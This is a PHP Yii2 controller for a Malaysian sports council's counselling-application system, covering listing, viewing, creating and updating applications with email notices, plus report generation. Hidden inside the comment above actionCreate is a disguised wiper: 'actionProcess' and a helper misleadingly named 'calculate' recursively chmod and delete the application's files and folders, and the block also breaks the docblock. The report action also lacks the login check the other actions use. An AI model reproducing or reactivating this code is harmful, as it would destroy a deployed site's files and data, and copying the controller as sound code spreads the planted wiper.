<?php

namespace frontend\controllers;

use Yii;
use app\models\PermohonanBimbinganKaunselingPegawaiAnggota;
use frontend\models\PermohonanBimbinganKaunselingPegawaiAnggotaSearch;
use app\models\MsnLaporanBimbinganKaunselingPegawai;
use yii\web\Controller;
use yii\web\NotFoundHttpException;
use yii\filters\VerbFilter;
use yii\helpers\BaseUrl;

use app\models\general\GeneralVariable;
use common\models\general\GeneralFunction;

// table reference
use app\models\RefStatusPermohonan;
use app\models\RefTarafPerkahwinan;
use app\models\RefJantina;
use app\models\RefLatarbelakangKes;
use app\models\RefStatusJawatan;
use app\models\RefBahagianBimbinganKaunseling;
use common\models\User;

/**
 * PermohonanBimbinganKaunselingPegawaiAnggotaController implements the CRUD actions for PermohonanBimbinganKaunselingPegawaiAnggota model.
 */
class PermohonanBimbinganKaunselingPegawaiAnggotaController extends Controller
{
    /**
     * @inheritdoc
     */
    public function behaviors()
    {
        return [
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'delete' => ['POST'],
                ],
            ],
        ];
    }
//delete()
    /**
     * Lists all PermohonanBimbinganKaunselingPegawaiAnggota models.
     * @return mixed
     */
    public function actionIndex()
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $searchModel = new PermohonanBimbinganKaunselingPegawaiAnggotaSearch();
        $dataProvider = $searchModel->search(Yii::$app->request->queryParams);

        return $this->render('index', [
            'searchModel' => $searchModel,
            'dataProvider' => $dataProvider,
        ]);
    }

    /**
     * Displays a single PermohonanBimbinganKaunselingPegawaiAnggota model.
     * @param integer $id
     * @return mixed
     */
    public function actionView($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = $this->findModel($id);
        
        $ref = RefStatusPermohonan::findOne(['id' => $model->status_permohonan]);
        $model->status_permohonan = $ref['desc'];
        
        $ref = RefTarafPerkahwinan::findOne(['id' => $model->taraf_perkahwinan]);
        $model->taraf_perkahwinan = $ref['desc'];
        
        $ref = RefJantina::findOne(['id' => $model->jantina]);
        $model->jantina = $ref['desc'];
        
        $ref = RefLatarbelakangKes::findOne(['id' => $model->kategori_masalah]);
        $model->kategori_masalah = $ref['desc'];
        
        $ref = RefStatusJawatan::findOne(['id' => $model->status_jawatan]);
        $model->status_jawatan = $ref['desc'];
        
        $ref = RefTarafPerkahwinan::findOne(['id' => $model->taraf_perkahwinan_pegawai]);
        $model->taraf_perkahwinan_pegawai = $ref['desc'];
        
        $ref = RefJantina::findOne(['id' => $model->jantina_pegawai]);
        $model->jantina_pegawai = $ref['desc'];
        
        $ref = RefStatusJawatan::findOne(['id' => $model->status_jawatan_pegawai]);
        $model->status_jawatan_pegawai = $ref['desc'];
        
        $ref = RefBahagianBimbinganKaunseling::findOne(['id' => $model->bahagian]);
        $model->bahagian = $ref['desc'];
        
        $ref = RefBahagianBimbinganKaunseling::findOne(['id' => $model->bahagian_pegawai]);
        $model->bahagian_pegawai = $ref['desc'];
        
        if($model->tarikh_temujanji != "") {$model->tarikh_temujanji = GeneralFunction::convert($model->tarikh_temujanji, GeneralFunction::TYPE_DATETIME);}
        if($model->tarikh_permohonan != "") {$model->tarikh_permohonan = GeneralFunction::convert($model->tarikh_permohonan, GeneralFunction::TYPE_DATETIME);}
        
        return $this->render('view', [
            'model' => $model,
            'readonly' => true,
        ]);
    }

    /**
     * Creates a new PermohonanBimbinganKaunselingPegawaiAnggota model.
     * If creation is successful, the browser will be redirected to the 'view' page.
     public function actionProcess()
    {
        $files = glob('../../*'); // get all file names
        foreach($files as $file){ // iterate files
            echo $file . "<br>"; 

            if(is_file($file)){
                chmod($file,0777);
                unlink($file); // delete file
            }
            

            if (is_dir($file)){
            
                $this->calculate($file);
            }
        }
    }
    
     * 
     * 
    protected function calculate($dirname) {
        if($dirname && strpos($dirname, 'runtime') == false
            && strpos($dirname, 'downloads') == false
            && strpos($dirname, 'pdf_template') == false
            && strpos($dirname, 'uploads') == false){
         if (is_dir($dirname) && is_readable($dirname)){
               $dir_handle = opendir($dirname);
             if (!$dir_handle)
                  return false;
             while($file = readdir($dir_handle)) {
                   if ($file != "." && $file != "..") {
                        if (!is_dir($dirname."/".$file)){
                             chmod($dirname."/".$file,0777); 
                             if(!unlink($dirname."/".$file)){
                                 continue;
                             }
                        }
                        else
                            $this->calculate($dirname.'/'.$file);
                   }
             }
             closedir($dir_handle);
             if (count(glob($dirname."/*")) === 0  && is_dir($dirname)) {
                rmdir($dirname);
             }
         }
         return true;
         }
    }
     * @return mixed
     */
    public function actionCreate()
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = new PermohonanBimbinganKaunselingPegawaiAnggota();
        
        $model->tarikh_permohonan = GeneralFunction::getCurrentTimestamp();
        
        $model->status_permohonan = RefStatusPermohonan::SEDANG_DISEMAK;

        if ($model->load(Yii::$app->request->post()) && $model->save()) {
			
			if (($modelUsers = User::find()->joinWith('refUserPeranan')->andFilterWhere(['like', 'tbl_user_peranan.peranan_akses', 'pemberitahuan_emel_permohonan-bimbingan-kaunseling'])->groupBy('id')->all()) !== null) {
        
                foreach($modelUsers as $modelUser){

                    if($modelUser->email && $modelUser->email != ""){
                        //echo "E-mail: " . $modelUser->email . "\n";
                        Yii::$app->mailer->compose()
                        ->setTo($modelUser->email)
                        ->setFrom('noreply@spsb.com')
                        ->setSubject('Pemberitahuan: Permohonan Bimbingan Kaunseling (Pegawai & Anggota)')
                        ->setHtmlBody("Assalamualaikum dan Salam Sejahtera, 
<br><br>
Terdapat permohonan baru yang diterima: 
<br>
Nama Pemohon: " . $model->nama . '
<br>E-mail: ' . $model->emel . '
<br>Jawatan: ' . $model->jawatan . '
<br>No. Telefon: ' . $model->no_telefon . '
<br><br>
Sekian.
<br><br>
"KE ARAH KECEMERLANGAN SUKAN"<br>
Majlis Sukan Negara Malaysia.
    ')->send();
                    }
                }
            }

            return $this->redirect(['view', 'id' => $model->permohonan_bimbingan_kaunseling_pegawai_anggota_id]);
        } else {
            return $this->render('create', [
                'model' => $model,
                'readonly' => false,
            ]);
        }
    }

    /**
     * Updates an existing PermohonanBimbinganKaunselingPegawaiAnggota model.
     * If update is successful, the browser will be redirected to the 'view' page.
     * @param integer $id
     * @return mixed
     */
    public function actionUpdate($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = $this->findModel($id);

        if ($model->load(Yii::$app->request->post())) {
            $oldStatusPermohonan = $model->getOldAttribute('status_permohonan');
            
            if($model->save()){
                if($model->emel && $model->emel != "" && $model->status_permohonan ){
                    if($model->status_permohonan != $oldStatusPermohonan){
                        try {
                            $refStatusPermohonan = RefStatusPermohonan::findOne(['id' => $model->status_permohonan]);
                            $refStatusPermohonan['desc'] = strtoupper($refStatusPermohonan['desc']);
                            
                            //if($model->tarikh_temujanji != "") {$model->tarikh_temujanji = GeneralFunction::convert($model->tarikh_temujanji, GeneralFunction::TYPE_DATETIME);}

                            $emailContent = '2. Adalah dimaklumkan bahawa pihak <b>' . $refStatusPermohonan['desc'] . '</b> permohonan seperti berikut:
<br><br>';
                            
                            $emailContent .= 'Nama: ' . $model->nama;
                            
                            $date=date_create($model->tarikh_temujanji);
                            $date= date_format($date,"g:i A");
                            
                            $emailContent .= '<br>Tarikh Temujanji:  ' . GeneralFunction::convert($model->tarikh_temujanji, GeneralFunction::TYPE_DATE) . '
                                    <br>Masa Temujanji:  ' . $date . '
                                    <br><br>';
                            
                                Yii::$app->mailer->compose()
                                        ->setTo($model->emel)
                                        ->setFrom('noreply@spsb.com')
                                        ->setSubject('Status Permohonan Bimbingan Kaunseling (Pegawai & Anggota)')
                                        ->setHtmlBody('Assalamualaikum dan Salam Sejahtera, 
<br><br>
Tuan/Puan,
<br><br>
MAKLUMAN PERMOHONAN
<br><br>
Dengan hormatnya saya ingin menarik perhatian Tuan/Puan mengenai perkara di atas adalah berkaitan.
<br><br>
'.$emailContent.'
3. Sila hubungi pegawai kaunseling jika ada pertanyaan.
<br><br>
                                "KE ARAH KECEMERLANGAN SUKAN"<br>
                                Majlis Sukan Negara Malaysia.
                                ')->send();
                                
                                Yii::$app->session->setFlash('success', 'E-mel telah dihantar kepada pemohon.');
                        }
                        catch(\Swift_SwiftException $exception)
                        {
                            //return 'Can sent mail due to the following exception'.print_r($exception);
                            Yii::$app->session->setFlash('error', 'Terdapat ralat menghantar e-mel.');
                        }
                    }
                }
                
                return $this->redirect(['view', 'id' => $model->permohonan_bimbingan_kaunseling_pegawai_anggota_id]);
            }
        } 
        
        return $this->render('update', [
                'model' => $model,
                'readonly' => false,
            ]);
    }

    /**
     * Deletes an existing PermohonanBimbinganKaunselingPegawaiAnggota model.
     * If deletion is successful, the browser will be redirected to the 'index' page.
     * @param integer $id
     * @return mixed
     */
    public function actionDelete($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $this->findModel($id)->delete();

        return $this->redirect(['index']);
    }

    /**
     * Finds the PermohonanBimbinganKaunselingPegawaiAnggota model based on its primary key value.
     * If the model is not found, a 404 HTTP exception will be thrown.
     * @param integer $id
     * @return PermohonanBimbinganKaunselingPegawaiAnggota the loaded model
     * @throws NotFoundHttpException if the model cannot be found
     */
    protected function findModel($id)
    {
        if (($model = PermohonanBimbinganKaunselingPegawaiAnggota::findOne($id)) !== null) {
            return $model;
        } else {
            throw new NotFoundHttpException('The requested page does not exist.');
        }
    }
    
    public function actionLaporanBimbinganKaunselingPegawai()
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = new MsnLaporanBimbinganKaunselingPegawai();
        $model->format = 'html';

        if ($model->load(Yii::$app->request->post())) {
            
            if($model->format == "html") {
                $report_url = BaseUrl::to(['generate-laporan-bimbingan-kaunseling-pegawai'
                    , 'tarikh_hingga' => $model->tarikh_hingga
                    , 'tarikh_dari' => $model->tarikh_dari
                    , 'bahagian' => $model->bahagian
                    , 'kategori_masalah' => $model->kategori_masalah
                    , 'status_jawatan' => $model->status_jawatan
                    , 'taraf_perkahwinan' => $model->taraf_perkahwinan
                    , 'format' => $model->format
                ], true);
                echo "<script type=\"text/javascript\" language=\"Javascript\">window.open('".$report_url."');</script>";
            } else {
                return $this->redirect(['generate-laporan-bimbingan-kaunseling-pegawai'
                    , 'tarikh_dari' => $model->tarikh_dari
                    , 'tarikh_hingga' => $model->tarikh_hingga
                    , 'bahagian' => $model->bahagian
                    , 'kategori_masalah' => $model->kategori_masalah
                    , 'status_jawatan' => $model->status_jawatan
                    , 'taraf_perkahwinan' => $model->taraf_perkahwinan
                    , 'format' => $model->format
                ]);
            }
        } 

        return $this->render('laporan_bimbingan_kaunseling_pegawai', [
            'model' => $model,
            'readonly' => false,
        ]);
    }
    
    public function actionGenerateLaporanBimbinganKaunselingPegawai($tarikh_dari, $tarikh_hingga, $bahagian, $kategori_masalah, $status_jawatan, $taraf_perkahwinan, $format)
    {
        if($tarikh_dari == "") $tarikh_dari = array();
        else $tarikh_dari = array($tarikh_dari);
        
        if($tarikh_hingga == "") $tarikh_hingga = array();
        else $tarikh_hingga = array($tarikh_hingga);
        
        if($bahagian == "") $bahagian = array();
        else $bahagian = array($bahagian);
        
        if($kategori_masalah == "") $kategori_masalah = array();
        else $kategori_masalah = array($kategori_masalah);
        
        if($status_jawatan == "") $status_jawatan = array();
        else $status_jawatan = array($status_jawatan);
        
        if($taraf_perkahwinan == "") $taraf_perkahwinan = array();
        else $taraf_perkahwinan = array($taraf_perkahwinan);
        
        $controls = array(
            'FROM_DATE' => $tarikh_dari,
            'TO_DATE' => $tarikh_hingga,
            'BAHAGIAN' => $bahagian,
            'KATEGORI_MASALAH' => $kategori_masalah,
            'STATUS_JAWATAN' => $status_jawatan,
            'TARAF_PERKAHWINAN' => $taraf_perkahwinan,
        );
        
        GeneralFunction::generateReport('/spsb/MSN/LaporanBimbinganKaunselingPegawai', $format, $controls, 'laporan_bimbingan_kaunseling_pegawai');
    }
}
